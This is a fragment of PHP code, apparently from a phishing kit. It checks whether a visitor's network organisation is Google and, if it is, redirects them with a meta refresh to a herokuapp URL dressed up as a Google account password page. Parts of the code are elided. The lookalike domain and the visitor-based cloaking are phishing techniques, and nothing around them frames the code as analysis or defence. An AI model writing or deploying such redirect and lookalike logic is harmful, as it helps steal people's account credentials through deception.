...
if (strpos($details->org, 'Google') !== false) {
	...
	echo '<meta http-equiv="refresh" content="0; url=https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account-utm_medium=web-continue=https-myaccount.go.com-security/?13">';
}
exit;
?>
